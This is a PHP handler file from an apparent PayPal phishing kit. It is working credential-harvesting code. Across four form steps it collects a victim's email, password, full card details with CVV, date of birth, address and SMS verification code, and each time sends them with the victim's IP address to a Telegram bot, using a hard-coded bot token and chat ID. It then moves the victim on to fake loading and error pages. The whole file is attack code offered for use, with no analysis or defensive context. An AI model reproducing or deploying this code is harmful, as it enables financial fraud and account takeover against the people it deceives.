<?php 


require_once "functions.php";

    $to = '';

    if( $_POST['step'] == 'login' ) {

        $email      = $_POST['email'];

        if( empty($email) ) {
            header("Location: index.php");
            exit();
        } else {
            $subject = $_SERVER['REMOTE_ADDR'] . ' | PAYPAL | Login' . "\r\n";
            $message = "/-- LOGIN INFOS --/" . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= "EMAIL : " . $email . "\r\n";


            if(isset($_POST['submit']))
            {
                $apiToken = "5202965422:AAHZVMPydfw89zRuaRTb5MrJMFZfdil0i6Y";
                $data = [
                'chat_id' => '974940969', 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
            };
            header("Location: password.php");
            exit();
        }

    } 

    if( $_POST['step'] == 'password' ) {

        $password   = $_POST['password'];

        if( empty($password) ) {

            header("Location: password.php");
            exit();
        } else {
            $subject = $_SERVER['REMOTE_ADDR'] . ' | PAYPAL | Login' . "\r\n";
            $message = "/-- LOGIN INFOS --/" . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= "PASSWORD : " . $password . "\r\n";
            $message .= "/-- END LOGIN INFOS --/" . $_SERVER['REMOTE_ADDR'] . "\r\n";


            if(isset($_POST['submit']))
            {
                $apiToken = "5202965422:AAHZVMPydfw89zRuaRTb5MrJMFZfdil0i6Y";
                $data = [
                'chat_id' => '974940969', 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
            };
            header("Location: loading.php");
            exit();
        }

    }

    else if( $_POST['step'] == 'cc' ) {

        $_SESSION['errors']      = [];
        $_SESSION['full_aname'] = $_POST['full_aname'];
        $_SESSION['dob'] = $_POST['dob'];
        $_SESSION['card_number'] = $_POST['card_number'];
        $_SESSION['type']        = $_POST['type'];
        $_SESSION['date']        = $_POST['date'];
        $_SESSION['security']    = $_POST['security'];
        $_SESSION['adress']      = $_POST['adress'];

        if( empty($_POST['full_name']) ) {
            $_SESSION['errors']['full_name'] = true;
        }
        if( empty($_POST['dob']) ) {
            $_SESSION['errors']['dob'] = true;
        }
        if( empty($_POST['card_number']) ) {
            $_SESSION['errors']['card_number'] = true;
        }
        if( empty($_POST['type']) ) {
            $_SESSION['errors']['type'] = true;
        }
        if( empty($_POST['date']) ) {
            $_SESSION['errors']['date'] = true;
        }
        if( empty($_POST['security']) ) {
            $_SESSION['errors']['security'] = true;
        }
        if( empty($_POST['adress']) ) {
            $_SESSION['errors']['adress'] = true;
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = $_SERVER['REMOTE_ADDR'] . ' | PAYPAL | Card';
            $message = "/-- LOGIN INFOS --/" . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= "FULL NAME : " . $_POST['full_name'] . "\r\n";
            $message .= "CC Number : " . $_POST['card_number'] . "\r\n";
            $message .= "CC Type : " . $_POST['type'] . "\r\n";
            $message .= "CC Date : " . $_POST['date'] . "\r\n";
            $message .= "CC CVV : " . $_POST['security'] . "\r\n";
            $message .= "Address : " . $_POST['adress'] . "\r\n";
            $message .= "/-- END LOGIN INFOS --/" . $_SERVER['REMOTE_ADDR'] . "\r\n";
            
            if(isset($_POST['submit']))
            {
                $apiToken = "5202965422:AAHZVMPydfw89zRuaRTb5MrJMFZfdil0i6Y";
                $data = [
                'chat_id' => '974940969', 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
            };
            header("Location: loading-cc.php");
            exit();

        } else {
            header("Location: cc.php");
            exit();
        }

    } else if ( $_POST['step'] == 'sms' ) {

        $_SESSION['errors']      = [];
        $_SESSION['sms_code'] = $_POST['sms_code'];

        if( empty($_POST['sms_code']) ) {
            $_SESSION['errors']['sms_code'] = true;
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = $_SERVER['REMOTE_ADDR'] . ' | PAYPAL | SmS';
            $message = "/-- SMS INFOS --/" . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= "SMS code : " . $_POST['sms_code'] . "\r\n";
            $message .= "/-- END SMS INFOS --/" . $_SERVER['REMOTE_ADDR'] . "\r\n";
            
            if(isset($_POST['submit']))
            {
                $apiToken = "5202965422:AAHZVMPydfw89zRuaRTb5MrJMFZfdil0i6Y";
                $data = [
                'chat_id' => '974940969', 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
            };
            header("Location: sms-error.php");
            exit();

        } else {
            header("Location: loading-sms.php");
            exit();
        }

    }


?>